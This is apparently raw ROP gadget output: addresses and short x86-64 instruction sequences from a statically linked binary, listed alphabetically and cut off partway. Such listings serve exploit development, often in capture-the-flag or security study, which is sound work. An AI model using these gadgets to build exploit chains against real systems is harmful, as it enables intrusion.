0x0000000000497d5b : add byte ptr [rax], ah ; add byte ptr ds:[rax], al ; mov al, 0x40 ; cli ; call qword ptr [rbx]
0x000000000049945b : add byte ptr [rax], ah ; push rbp ; add byte ptr [rax], al ; sar bl, 1 ; cli ; call rsp
0x000000000049ce4e : add byte ptr [rax], al ; adc al, 0x8f ; add byte ptr [rax], al ; lodsb al, byte ptr [rsi] ; pop rsi ; std ; jmp qword ptr [rdx]
0x0000000000497ebe : add byte ptr [rax], al ; adc byte ptr [rcx - 6], cl ; jmp qword ptr [rcx]
0x000000000049583e : add byte ptr [rax], al ; add al, 0x19 ; add byte ptr [rax], al ; in al, dx ; ja 0x495847 ; call qword ptr [rdx]
0x000000000049443f : add byte ptr [rax], al ; add al, 0xf7 ; call qword ptr [rdx]
0x000000000043ee2b : add byte ptr [rax], al ; add al, ch ; pop rbp ; ret
0x0000000000402835 : add byte ptr [rax], al ; add al, ch ; ret
0x000000000047fb9d : add byte ptr [rax], al ; add al, dh ; popfq ; cld ; jmp rax
0x000000000044d0d6 : add byte ptr [rax], al ; add bh, al ; test dword ptr [rax], ecx ; idiv edi ; call qword ptr [rax]
0x0000000000406fed : add byte ptr [rax], al ; add bh, bh ; adc ecx, dword ptr [rax - 0x7d] ; ret
0x00000000004703cd : add byte ptr [rax], al ; add bh, bh ; ror dword ptr [rax - 0x77], cl ; ret
0x000000000044b52d : add byte ptr [rax], al ; add bh, dh ; ret 0xffef
0x0000000000460e8f : add byte ptr [rax], al ; add bl, al ; mov eax, 2 ; ret
0x000000000041373e : add byte ptr [rax], al ; add bl, ch ; ret
0x000000000040cd1b : add byte ptr [rax], al ; add bl, dh ; ret
0x000000000049827a : add byte ptr [rax], al ; add byte ptr [r8], al ; push rax ; pop rax ; cli ; call qword ptr [rdx]
0x0000000000415bbd : add byte ptr [rax], al ; add byte ptr [rax + 0x16], bh ; ret
0x0000000000456431 : add byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; ret
0x0000000000453f2f : add byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; ret 0x8349
0x00000000004665f5 : add byte ptr [rax], al ; add byte ptr [rax + 0x29], cl ; ret 0x8d48
0x0000000000462383 : add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; dec byte ptr [rax + 0xf] ; ret 0x31c3
0x0000000000410556 : add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret
0x0000000000475311 : add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x830f
0x000000000040b18d : add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x850f
0x00000000004753a6 : add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x9272
0x000000000046b53b : add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0xd589
0x00000000004589ba : add byte ptr [rax], al ; add byte ptr [rax + 0x63], cl ; ret
0x0000000000499ec1 : add byte ptr [rax], al ; add byte ptr [rax + 0x7800005f], cl ; ret
0x0000000000436aed : add byte ptr [rax], al ; add byte ptr [rax + 0x78d4837], cl ; ret
0x000000000043a505 : add byte ptr [rax], al ; add byte ptr [rax + 0xf48f0e5], al ; ret 0xc35b
0x00000000004126d2 : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret
0x000000000046fc22 : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x00000000004440b0 : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0x8948
0x000000000041364a : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0x894c
0x000000000043a478 : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0xc35b
0x0000000000460bad : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0xc3f3
0x0000000000444c0b : add byte ptr [rax], al ; add byte ptr [rax + 0xf], cl ; ret 0xf685
0x000000000046f0ea : add byte ptr [rax], al ; add byte ptr [rax + 1], bh ; ret
0x0000000000442330 : add byte ptr [rax], al ; add byte ptr [rax + 1], cl ; ret
0x000000000046e69d : add byte ptr [rax], al ; add byte ptr [rax + 1], cl ; ret 0x149
0x000000000046f2fb : add byte ptr [rax], al ; add byte ptr [rax + 2], bh ; ret
0x00000000004022fe : add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret
0x0000000000407eb1 : add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0x2c20
0x000000000043ba2d : add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0xffc0
0x0000000000447cc9 : add byte ptr [rax], al ; add byte ptr [rax - 0x3f], cl ; ret 0x4811
0x00000000004485fe : add byte ptr [rax], al ; add byte ptr [rax - 0x3f], cl ; ret 0x6411
0x000000000049d73a : add byte ptr [rax], al ; add byte ptr [rax - 0x57a00000], bl ; std ; call qword ptr [rbx]
0x0000000000410bad : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; adc byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000406f20 : add byte ptr [rax], al ; add byte ptr [rax - 0x75], cl ; js 0x406f4e ; call rdx
0x000000000040ed0d : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; clc ; ret
0x0000000000460622 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; fucomip st(0) ; ret
0x00000000004757bc : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; fucomip st(1) ; ret
0x000000000043dc2d : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ja 0x43dc5b ; ret
0x00000000004082f1 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x000000000041424a : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x1bf
0x0000000000409054 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x294c
0x000000000044e719 : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8148
0x000000000041145d : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x00000000004782dd : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8d48
0x00000000004542fd : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0xc148
0x0000000000476efd : add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; shr cl, 1 ; ret 0xfffe
0x0000000000474df4 : add byte ptr [rax], al ; add byte ptr [rax - 0x7ab70000], al ; ret 0x840f
0x0000000000455216 : add byte ptr [rax], al ; add byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x84 ; ret 5
0x000000000047aae5 : add byte ptr [rax], al ; add byte ptr [rax - 0x7b], cl ; sal byte ptr [rbp + 3], cl ; ret
0x000000000040569d : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00000000004389bd : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x3a01
0x00000000004402c3 : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000047044d : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4808
0x0000000000469678 : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4810
0x000000000045f44c : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4901
0x000000000041d3a3 : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004782bd : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x8001
0x0000000000430d01 : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000041d3cd : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x00000000004180bd : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; rol byte ptr [rax + 0x48], 0x83 ; ret 0x4840
0x0000000000448b26 : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; rol byte ptr [rcx], 0x83 ; ret 0x4801
0x0000000000473d48 : add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ror byte ptr [rax], 0x83 ; ret 0x3901
0x0000000000426ae4 : add byte ptr [rax], al ; add byte ptr [rax - 0x7f], cl ; ret 0x80
0x0000000000409ab8 : add byte ptr [rax], al ; add byte ptr [rax - 1], bh ; ret
0x00000000004971ae : add byte ptr [rax], al ; add byte ptr [rax - 8], dh ; call rsp
0x000000000047fb9b : add byte ptr [rax], al ; add byte ptr [rax], al ; add al, dh ; popfq ; cld ; jmp rax
0x0000000000406feb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bh, bh ; adc ecx, dword ptr [rax - 0x7d] ; ret
0x00000000004703cb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bh, bh ; ror dword ptr [rax - 0x77], cl ; ret
0x000000000044b52b : add byte ptr [rax], al ; add byte ptr [rax], al ; add bh, dh ; ret 0xffef
0x000000000040eccb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x000000000040b18b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x850f
0x000000000044232e : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax + 1], cl ; ret
0x000000000043ba2b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x39], cl ; ret 0xffc0
0x000000000040ed0b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; clc ; ret
0x000000000043dc2b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ja 0x43dc5d ; ret
0x0000000000414248 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x1bf
0x000000000041145b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x00000000004782db : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x8d48
0x00000000004542fb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0xc148
0x0000000000476efb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; shr cl, 1 ; ret 0xfffe
0x000000000040569b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00000000004389bb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x3a01
0x000000000045f7fb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4801
0x000000000047044b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4808
0x00000000004782bb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x8001
0x000000000040dddf : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000488732 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x24
0x0000000000488c22 : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x33
0x0000000000464c7c : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rbp - 0x77], cl ; ret
0x0000000000438bfb : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rcx + 1], cl ; ret
0x000000000041840b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret 0x7f10
0x0000000000416d1b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret 0xf10
0x000000000040c39b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rdi + rcx - 0x42], cl ; ret 0x4a8d
0x000000000040a90b : add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 2 ; ret
0x000000000043c70b : add byte ptr [rax], al ; add byte ptr [rax], al ; add dh, dh ; ret 0x7404
0x00000000004548fb : add byte ptr [rax], al ; add byte ptr [rax], al ; add dh, dh ; ret 0xf50
0x00000000004610ac : add byte ptr [rax], al ; add byte ptr [rax], al ; add rax, 3 ; ret
0x000000000047ab45 : add byte ptr [rax], al ; add byte ptr [rax], al ; add rsp, 0x10 ; pop rbx ; ret
0x000000000046d0df : add byte ptr [rax], al ; add byte ptr [rax], al ; add rsp, 8 ; ret
0x0000000000406fec : add byte ptr [rax], al ; add byte ptr [rax], al ; call qword ptr [rbx]
0x00000000004703cc : add byte ptr [rax], al ; add byte ptr [rax], al ; call rbx
0x000000000048a75c : add byte ptr [rax], al ; add byte ptr [rax], al ; call rdi
0x000000000048990c : add byte ptr [rax], al ; add byte ptr [rax], al ; call rsp
0x000000000043a477 : add byte ptr [rax], al ; add byte ptr [rax], al ; cmove rax, rdx ; pop rbx ; ret
0x00000000004774c4 : add byte ptr [rax], al ; add byte ptr [rax], al ; je 0x4774ac ; ret
0x0000000000458fa5 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp rax
0x000000000043711c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 0xa] ; ret
0x000000000043712c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 0xb] ; ret
0x000000000043713c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 0xc] ; ret
0x000000000043714c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 0xd] ; ret
0x000000000043715c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 0xe] ; ret
0x000000000043709c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 1] ; ret
0x00000000004370ac : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 2] ; ret
0x00000000004370bc : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 3] ; ret
0x00000000004370cc : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 4] ; ret
0x00000000004370dc : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 5] ; ret
0x00000000004370ec : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 6] ; ret
0x00000000004370fc : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 8] ; ret
0x000000000043710c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi + 9] ; ret
0x000000000043708c : add byte ptr [rax], al ; add byte ptr [rax], al ; lea rax, [rdi] ; ret
0x0000000000436aec : add byte ptr [rax], al ; add byte ptr [rax], al ; mov byte ptr [rdi], dh ; lea rax, [rdi] ; ret
0x00000000004364cc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov byte ptr [rdi], dh ; ret
0x0000000000415bbc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 0x16 ; ret
0x000000000040ec8c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 0xffffffff ; ret
0x000000000046f0e9 : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 1 ; ret
0x000000000046f2fa : add byte ptr [rax], al ; add byte ptr [rax], al ; mov eax, 2 ; ret
0x0000000000427acc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x000000000043dc2c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rdi + 0x20], rsi ; ret
0x000000000040fa74 : add byte ptr [rax], al ; add byte ptr [rax], al ; mov qword ptr [rdi + 0x60], rcx ; ret
0x000000000046d0ec : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, qword ptr [rax + 8] ; ret
0x000000000040ecfc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, qword ptr [rdi + 0x68] ; ret
0x000000000040ed0c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, rdi ; ret
0x000000000040a90c : add byte ptr [rax], al ; add byte ptr [rax], al ; movzx eax, byte ptr [rdx] ; ret
0x000000000043a4bc : add byte ptr [rax], al ; add byte ptr [rax], al ; movzx eax, cl ; pop rbx ; ret
0x0000000000427c1c : add byte ptr [rax], al ; add byte ptr [rax], al ; movzx edx, byte ptr [rsi] ; mov byte ptr [rdi], dl ; ret
0x0000000000400b5b : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x000000000040961c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x000000000049dc39 : add byte ptr [rax], al ; add byte ptr [rax], al ; popfq ; add byte ptr [rax], al ; ret 0xfffd
0x000000000040ddb8 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x000000000048972c : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x1d4
0x0000000000489ec4 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x1d5
0x0000000000488734 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x24
0x0000000000488c24 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x33
0x0000000000400407 : add byte ptr [rax], al ; add byte ptr [rax], al ; test rax, rax ; je 0x40041b ; call rax
0x000000000041dbfc : add byte ptr [rax], al ; add byte ptr [rax], al ; vzeroupper ; xor eax, eax ; ret
0x000000000040decc : add byte ptr [rax], al ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000045ff1c : add byte ptr [rax], al ; add byte ptr [rax], al ; xor eax, eax ; vzeroupper ; ret
0x0000000000436ecc : add byte ptr [rax], al ; add byte ptr [rax], al ; xor rax, rax ; ret
0x000000000049773a : add byte ptr [rax], al ; add byte ptr [rax], bh ; add byte ptr [rax], al ; push rax ; sub edx, edi ; call qword ptr [rdx]
0x0000000000499e61 : add byte ptr [rax], al ; add byte ptr [rax], ch ; pop rdi ; add byte ptr [rax], al ; pop rax ; ret 0xfffb
0x000000000047c66d : add byte ptr [rax], al ; add byte ptr [rax], cl ; xchg eax, esp ; stc ; jmp qword ptr [rax]
0x000000000043b744 : add byte ptr [rax], al ; add byte ptr [rbp + 0x10], dh ; add rsp, 0x28 ; ret
0x000000000046d69d : add byte ptr [rax], al ; add byte ptr [rbp + 0x12], dh ; add rsp, 0x38 ; ret
0x000000000046f44c : add byte ptr [rax], al ; add byte ptr [rbp + 0x14], dh ; add rsp, 0x38 ; ret
0x00000000004783d1 : add byte ptr [rax], al ; add byte ptr [rbp + 0x1a], dh ; ret
0x000000000046d433 : add byte ptr [rax], al ; add byte ptr [rbp + 0x1c], dh ; add rsp, 0x48 ; ret
0x0000000000461f80 : add byte ptr [rax], al ; add byte ptr [rbp + 0x1e], dh ; add rsp, 0x38 ; ret
0x000000000044f8ff : add byte ptr [rax], al ; add byte ptr [rbp + 0x29], cl ; ret 0xf4c
0x000000000046d28e : add byte ptr [rax], al ; add byte ptr [rbp + 0x30], dh ; add rsp, 0x38 ; ret
0x0000000000447a35 : add byte ptr [rax], al ; add byte ptr [rbp + 0x31], al ; leave ; call r15
0x000000000046eeae : add byte ptr [rax], al ; add byte ptr [rbp + 0x3b], dh ; leave ; ret
0x000000000043c85d : add byte ptr [rax], al ; add byte ptr [rbp + 0x41], bl ; pop rsp ; jmp rax
0x000000000043b974 : add byte ptr [rax], al ; add byte ptr [rbp + 0x42], dh ; add rsp, 0x58 ; ret
0x000000000043bbc3 : add byte ptr [rax], al ; add byte ptr [rbp + 0x43], dh ; add rsp, 0x18 ; ret
0x0000000000461e39 : add byte ptr [rax], al ; add byte ptr [rbp + 0x45], dh ; add rsp, 0x58 ; ret
0x0000000000474c76 : add byte ptr [rax], al ; add byte ptr [rbp + 0xb], dh ; add rsp, 0x28 ; ret
0x000000000046d323 : add byte ptr [rax], al ; add byte ptr [rbp + 0xc], dh ; add rsp, 0x38 ; ret
0x000000000043c673 : add byte ptr [rax], al ; add byte ptr [rbp + 0xf], dh ; add rsp, 0x28 ; ret
0x0000000000472cc8 : add byte ptr [rax], al ; add byte ptr [rbp + 0xf], dh ; add rsp, 0x38 ; ret
0x000000000044a44c : add byte ptr [rax], al ; add byte ptr [rbp + 5], dh ; add rsp, 0x18 ; ret
0x000000000046fa7a : add byte ptr [rax], al ; add byte ptr [rbp + 5], dh ; add rsp, 0x38 ; ret
0x000000000043bd44 : add byte ptr [rax], al ; add byte ptr [rbp + 5], dh ; add rsp, 0x58 ; ret
0x0000000000477506 : add byte ptr [rax], al ; add byte ptr [rbp + rax + 0x48], dh ; mov dword ptr [rdi + rsi*8], edx ; ret
0x000000000043b2e2 : add byte ptr [rax], al ; add byte ptr [rbp + rcx*4 + 0x3d], cl ; ret 0x42a
0x000000000043d898 : add byte ptr [rax], al ; add byte ptr [rbp - 0x3dbbf040], al ; ret
0x0000000000464c7e : add byte ptr [rax], al ; add byte ptr [rbp - 0x77], cl ; ret
0x000000000045439f : add byte ptr [rax], al ; add byte ptr [rbp - 0x7b], cl ; rol byte ptr [rcx + 0xf], cl ; xchg eax, esp ; ret 0xf45
0x000000000049ac3a : add byte ptr [rax], al ; add byte ptr [rbp], ch ; add byte ptr [rax], dh ; cld ; jmp rdx
0x0000000000447e59 : add byte ptr [rax], al ; add byte ptr [rbx + 0x41], bl ; pop rsp ; ret
0x00000000004273ad : add byte ptr [rax], al ; add byte ptr [rbx + 0x5789fc56], cl ; cld ; ret
0x000000000046ffd9 : add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x0000000000401484 : add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x0000000000407e59 : add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; ret
0x00000000004774c5 : add byte ptr [rax], al ; add byte ptr [rbx + rbx*8 - 0xd], dh ; ret
0x000000000045a72d : add byte ptr [rax], al ; add byte ptr [rbx - 0x4f743], al ; jmp qword ptr [rax]
0x000000000045a322 : add byte ptr [rax], al ; add byte ptr [rbx - 0x51f43], al ; call qword ptr [rax]
0x000000000045403a : add byte ptr [rax], al ; add byte ptr [rbx - 0x77], bl ; rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; ret
0x000000000047926d : add byte ptr [rax], al ; add byte ptr [rbx - 0x7fbf8f19], al ; jmp qword ptr [rax]
0x000000000044c38b : add byte ptr [rax], al ; add byte ptr [rbx - 0x8f743], al ; call qword ptr [rax]
0x0000000000409344 : add byte ptr [rax], al ; add byte ptr [rcx + 0x2b], cl ; and byte ptr [r8 + 1], r9b ; ret
0x0000000000455d08 : add byte ptr [rax], al ; add byte ptr [rcx + 0x415d5bd0], cl ; pop rsp ; ret
0x0000000000456e18 : add byte ptr [rax], al ; add byte ptr [rcx + 0xf], al ; mov dh, 0x56 ; or al, 0x83 ; ret
0x0000000000456da5 : add byte ptr [rax], al ; add byte ptr [rcx + 0xf], al ; mov dh, 0x56 ; or al, 0xf6 ; ret 0xf08
0x000000000045ae59 : add byte ptr [rax], al ; add byte ptr [rcx + 0xf], al ; ret 0x3941
0x0000000000438bfd : add byte ptr [rax], al ; add byte ptr [rcx + 1], cl ; ret
0x00000000004602fd : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 0x40], cl ; vzeroupper ; ret
0x0000000000471656 : add byte ptr [rax], al ; add byte ptr [rcx - 0x77], al ; ret
0x000000000044d911 : add byte ptr [rax], al ; add byte ptr [rcx - 0x77], cl ; ret
0x0000000000413ee3 : add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; jmp qword ptr [rax]
0x0000000000412791 : add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret
0x000000000041840d : add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret 0x7f10
0x0000000000416d1d : add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret 0xf10
0x000000000041ddd0 : add byte ptr [rax], al ; add byte ptr [rcx - 9], cl ; ret 1
0x000000000041ddf6 : add byte ptr [rax], al ; add byte ptr [rcx - 9], cl ; ret 2
0x0000000000455b78 : add byte ptr [rax], al ; add byte ptr [rcx], ch ; ret 0xd089
0x0000000000407202 : add byte ptr [rax], al ; add byte ptr [rcx], dh ; rcr byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x000000000041d6da : add byte ptr [rax], al ; add byte ptr [rcx], dh ; rol bl, 0x83 ; ret 0x6620
0x00000000004617fd : add byte ptr [rax], al ; add byte ptr [rcx], dh ; shr bl, 0xb9 ; call 0x43dad9
0x0000000000477233 : add byte ptr [rax], al ; add byte ptr [rdi + 1], bh ; call r14
0x000000000047725b : add byte ptr [rax], al ; add byte ptr [rdi + 1], bh ; call rax
0x0000000000477faa : add byte ptr [rax], al ; add byte ptr [rdi + 2], dh ; sbb eax, eax ; ret
0x000000000045a6d5 : add byte ptr [rax], al ; add byte ptr [rdi + rcx + 0x48], cl ; fimul dword ptr [rbp + 0x63] ; ret
0x00000000004599e2 : add byte ptr [rax], al ; add byte ptr [rdi + rcx + 0x48], cl ; fmul dword ptr [rbp + 0x63] ; ret
0x000000000040c39d : add byte ptr [rax], al ; add byte ptr [rdi + rcx - 0x42], cl ; ret 0x4a8d
0x000000000049443e : add byte ptr [rax], al ; add byte ptr [rdi + rsi*8], al ; call qword ptr [rdx]
0x000000000043a405 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; lahf ; ret 0xea81
0x0000000000427bad : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov bh, 0x16 ; mov word ptr [rdi], dx ; ret
0x0000000000427c1d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 0x16 ; mov byte ptr [rdi], dl ; ret
0x000000000043a4bd : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 0xc1 ; pop rbx ; ret
0x000000000040a90d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov dh, 2 ; ret
0x000000000041d71d : add byte ptr [rax], al ; add byte ptr [rdi], cl ; mov esp, 0xf80148c0 ; ret
0x0000000000448649 : add byte ptr [rax], al ; add byte ptr [rdi], cl ; ret 0xc083
0x000000000049963a : add byte ptr [rax], al ; add byte ptr [rdi], dl ; add byte ptr [rax + 0xd], ah ; sti ; call qword ptr [rcx]
0x0000000000477435 : add byte ptr [rax], al ; add byte ptr [rdx + 0x48], dh ; add esp, 0x18 ; ret
0x000000000041e8b2 : add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000041d642 : add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; xlatb ; ret 0xc085
0x000000000049849e : add byte ptr [rax], al ; add byte ptr fs:[r8], r8b ; push -6 ; jmp qword ptr [rdx]
0x000000000044490d : add byte ptr [rax], al ; add cl, ch ; ret
0x0000000000444557 : add byte ptr [rax], al ; add cl, ch ; ret 0xfffc
0x000000000045752d : add byte ptr [rax], al ; add dh, al ; test eax, esi ; idiv bh ; jmp qword ptr [rax]
0x000000000044cdff : add byte ptr [rax], al ; add dh, al ; test esp, eax ; idiv bh ; jmp qword ptr [rax]
0x000000000044279d : add byte ptr [rax], al ; add dh, dh ; ret 0x4801
0x000000000043c70d : add byte ptr [rax], al ; add dh, dh ; ret 0x7404
0x0000000000438351 : add byte ptr [rax], al ; add dh, dh ; ret 0x7501
0x00000000004548fd : add byte ptr [rax], al ; add dh, dh ; ret 0xf50
0x00000000004610ae : add byte ptr [rax], al ; add rax, 3 ; ret
0x000000000041d4f3 : add byte ptr [rax], al ; add rax, rdi ; add rax, rcx ; ret
0x000000000047ab47 : add byte ptr [rax], al ; add rsp, 0x10 ; pop rbx ; ret
0x00000000004096e2 : add byte ptr [rax], al ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x0000000000477470 : add byte ptr [rax], al ; add rsp, 0x18 ; ret
0x0000000000474f33 : add byte ptr [rax], al ; add rsp, 0x38 ; pop rbx ; pop r14 ; ret
0x000000000040cf6b : add byte ptr [rax], al ; add rsp, 0x38 ; pop rbx ; pop rbp ; ret
0x000000000043b869 : add byte ptr [rax], al ; add rsp, 0x68 ; ret
0x0000000000461d2e : add byte ptr [rax], al ; add rsp, 0x78 ; ret
0x0000000000440457 : add byte ptr [rax], al ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x0000000000413997 : add byte ptr [rax], al ; add rsp, 8 ; ret
0x000000000049765e : add byte ptr [rax], al ; and al, 0x37 ; add byte ptr [rax], al ; jl 0x49768e ; cli ; call rsp
0x000000000049945a : add byte ptr [rax], al ; and byte ptr [rbp], dl ; add al, dl ; sti ; cli ; call rsp
0x000000000049527e : add byte ptr [rax], al ; and byte ptr [rbx - 9], bl ; call rdi
0x0000000000499a9e : add byte ptr [rax], al ; and byte ptr [rcx], 0xfb ; call rsp
0x0000000000497d5a : add byte ptr [rax], al ; and byte ptr [rsi], bh ; add byte ptr [rax], al ; mov al, 0x40 ; cli ; call qword ptr [rbx]
0x000000000043a506 : add byte ptr [rax], al ; and ch, 0xf0 ; cmovne rax, rdx ; pop rbx ; ret
0x000000000041d71e : add byte ptr [rax], al ; bsf eax, eax ; add rax, rdi ; ret
0x0000000000432d40 : add byte ptr [rax], al ; bsf rax, rdx ; ret
0x000000000045fac4 : add byte ptr [rax], al ; bsr rax, rax ; add rax, rdi ; ret
0x0000000000498a96 : add byte ptr [rax], al ; call 0x1149853a
0x0000000000499916 : add byte ptr [rax], al ; call 0x1149943a
0x000000000049a7c6 : add byte ptr [rax], al ; call 0x2349a411
0x000000000049c0a6 : add byte ptr [rax], al ; call 0x2749bdb9
0x0000000000445702 : add byte ptr [rax], al ; call 0x4019f4
